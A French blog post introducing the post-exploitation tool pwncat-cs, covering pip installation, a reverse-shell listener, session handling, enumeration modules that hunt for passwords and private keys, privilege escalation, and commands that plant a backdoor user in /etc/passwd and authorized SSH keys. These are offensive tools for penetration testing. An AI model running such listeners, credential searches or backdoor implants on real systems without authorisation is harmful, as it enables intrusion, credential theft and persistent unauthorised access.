---
title: Stop using netcat, use Pwncat-cs
meta_title: ""
description: Petite documentationn d'utilisation d'un fancy rev et bind handler
date: 2024-04-04T05:00:00Z
image: /images/pwncat.png
categories:
  - Outils
author: Tmax
tags:
  - Outils
  - Fiches
  - Post-exploitation
draft: false
---

# Introduction

[Pwncat](https://github.com/calebstewart/pwncat) est un outil de post-exploitation qui facilite l'usage des reverse shell et embarque plusieurs avantages tels que la gestion des shells stabilisés et interactifs, la désactivation de l'historique, la gestion des multi-sessions... 

Ça vaut le détour. 

Voici le lien vers la [documentation officielle](https://pwncat.readthedocs.io/en/latest/). 

# Installation 

Il existe plusieurs méthodes d'installation, notamment avec `apt`. 
Nous aborderons seulement l'installation avec `pip` en utilisant un environnement virtuel. 

```bash
sudo apt-get install python3-pip # Installation de pip

# Installation de Venv 
sudo pip3 install virtualenv
# Ou avec 
sudo apt install python3-venv 

# Creation du Venv
python -m venv /opt/pwncat

# Installer pwncat dans notre venv 
/opt/pwncat/bin/pip install pwncat-cs

# Pour autoriser l'utilisation de pwncat hors de notre Venv 
ln -s /opt/pwncat/bin/pwncat-cs /usr/local/bin
```

# Utilisation 

Pour un usage basique, voici la section "Basic usage" de la [documentation](https://pwncat.readthedocs.io/en/latest/usage.html). 

Pour ce qui est d'un simple reverse shell : 

```bash
pwncat-cs -lp 4444
```

{{< image src="images/methode_pwncat1.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}

L'indication **(local)** vous indique que vous êtes encore sur votre machine. Avec `CTRL + D` vous pourrez alors passer en **(remote)** et avoir accès à la machine distante. 

La commande `help` est bien détaillée, vous pouvez aussi l'utiliser pour chaque commande dispo comme `help connect` par exemple. Sinon, vous pouvez retrouver plus de détails pour chaque commande [ici](https://pwncat.readthedocs.io/en/latest/commands/index.html).  

Vous pouvez entre autres gérer plusieurs connexions en même temps, créer des backdoors et mettre en "queue" chaque connexion entrante. 

Voici la liste des commandes dispo : 

```python
  Command     Description                                                   
 ────────────────────────────────────────────────────────────────────────── 
  alias       Alias an existing command with a new name. Specifying [...]   
  back        Return to the remote terminal                                 
  bind        Create key aliases for when in raw mode. This only [...]      
  connect     Connect to a remote victim. This command is only valid [...]  
  download    Download a file from the remote host to the local host        
  escalate    Attempt privilege escalation in the current session. [...]    
  exit        Exit the interactive prompt. If sessions are active, [...]    
  help        List known commands and print their associated help [...]     
  info        View info about a module                                      
  lcd         Change the local current working directory                    
  leave       Leave a layer of execution from this session. Layers [...]    
  listen      Create a new background listener. Background listeners [...]  
  listeners   Manage active or stopped background listeners. This [...]     
  load        Load modules from the specified directory. This does [...]    
  local       Run a local shell command on your attacking machine           
  lpwd        Print the local current working directory                     
  reset       Reset the remote terminal to the standard pwncat [...]        
  run         Run a module. If no module is specified, use the [...]        
  search      View info about a module                                      
  sessions    Interact and control active remote sessions. This [...]       
  set         Set variable runtime variable parameters for pwncat           
  shortcut                                                                  
  upload      Upload a file from the local host to the remote host          
  use         Set the currently used module in the config handler     
```

Pour lister vos sessions vous pouvez 

```bash
sessions
```

puis pour choisir de cibler l'une d'entre elles 

```bash
sessions ID_decimal 
```

## Modules

Vous pouvez aussi rechercher les modules disponibles que l'on peut exécuter avec la commande 
```
run {module_name} 
```

```python
(local) pwncat$ search enum*
                                                                          Results                                                                           
                                                         ╷                                                                                                  
  Name                                                   │ Description                                                                                      
 ════════════════════════════════════════════════════════╪═════════════════════════════════════════════════════════════════════════════════════════════════ 
  enumerate                                              │ Perform multiple enumeration modules and write a formatted report to the...                      
  enumerate.escalate.implant                             │ Generates escalation methods based on installed implants in order to...                          
  enumerate.escalate.replace                             │ Locate execute abilities and produce escalation methods from them. This...                       
  enumerate.gather                                       │ Perform multiple enumeration modules and write a formatted report to the...                      
  enumerate.creds.pam                                    │ Exfiltrate logged passwords from the pam-based persistence module. This...                       
  enumerate.creds.password                               │ Search the victim file system for configuration files which may contain...                       
  enumerate.creds.private_key                            │ Search the victim file system for configuration files which may contain...                       
  enumerate.escalate.append_passwd                       │ Check for possible methods of escalation via modifying /etc/passwd                               
  enumerate.escalate.leak_privkey                        │ Find escalation methods by using file-read abilities to leak other user's...                     
  enumerate.file.caps                                    │ Enumerate capabilities of the binaries of the remote host                                        
  enumerate.file.suid                                    │ Enumerate SUID binaries on the remote host                                                       
  enumerate.misc.writable_path                           │ Locate any components of the current PATH that are writable by the current user.                 
  enumerate.software.cron                                │ Check for any readable crontabs and return their entries.                                        
  enumerate.software.screen                              │ Locate installations of the ``screen`` tool. This is useful because it may be...                 
  enumerate.software.screen.cve_2017_5618                │ Identify systems vulnerable to CVE-2017-5618                                                     
  enumerate.software.sudo.cve_2019_14287                 │ Identify systems vulnerable to CVE-2019-14287: Sudo Bug Allows Restricted...                     
  enumerate.software.sudo.rules                          │ Enumerate sudo privileges for the current user. If allowed, this module will...                  
  enumerate.software.sudo.version                        │ Retrieve the version of sudo on the remote host                                                  
  enumerate.system.aslr                                  │ Determine whether or not ASLR is enabled or disabled. :return:                                   
  enumerate.system.container                             │ Check if this system is inside a container :return:                                              
  enumerate.system.distro                                │ Enumerate OS/Distribution version information                                                    
  enumerate.system.fstab                                 │ Read /etc/fstab and report on known block device mount points.                                   
  enumerate.system.hosts                                 │ Enumerate hosts identified in /etc/hosts which are not localhost :return:                        
  enumerate.system.init                                  │ Enumerate system init service :return:                                                           
  enumerate.system.network                               │ Enumerate network interfaces with active connections and return their name...                    
  enumerate.system.process                               │ Extract the currently running processes. This will parse the process...                          
  enumerate.system.selinux                               │ Retrieve the current SELinux state                                                               
  enumerate.system.services                              │ Enumerate systemd services on the victim                                                         
  enumerate.system.uname                                 │ Enumerate standard system properties provided by the `uname` command. This...                    
  enumerate.user                                         │ Enumerate users from a linux target                                                              
  enumerate.user.group                                   │ Enumerate users from a linux target     
```

Source : https://pwncat.readthedocs.io/en/latest/modules.html

## Escalade de privilège

Il est aussi possible d'utiliser la commande `escalate` pour trouver des techniques d'élévation de privilèges, mais je ne sais pas trop ce que ça donne : 

{{< image src="images/methode_pwncat2.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}

Et utiliser `escalate run` pour exécuter cette escalade de privilège.  

Source : https://pwncat.readthedocs.io/en/latest/privesc.html

## Implant et backdooring


```bash
#Installe une porte dérobée à l'intérieur de l'entreprise /etc/passwd
(local) pwncat$ run implant.passwd backdoor_user=pwncat backdoor_pass=pwncat

# Installe une clé publique autorisée en tant qu'utilisateur actuel
(local) pwncat$ run implant.authorized_key key=./id_rsa

# Installe une clé autorisée en tant qu'autre utilisateur (nécessite un accès root)
(local) pwncat$ run implant.authorized_key user=john key=./id_rsa
```

Il est également possible de créer un fichier de configuration qui run ces commandes dès qu'un shell est établi, plus d'infos [ici](https://pwncat.readthedocs.io/en/latest/configuration.html#configuration-parameters) 


```
# Liste des implants installés
(local) pwncat$ run implant list

# Tentative d'escalade avec un implant local ; il sera demandé quel(s) implant(s) utiliser.
(local) pwncat$ run implant escalate

# Pour lister les implants par ID
pwncat-cs --list

# Essaye de se reconnecter à un implant
pwncat-cs {ID}
```

Source : https://pwncat.readthedocs.io/en/latest/persist.html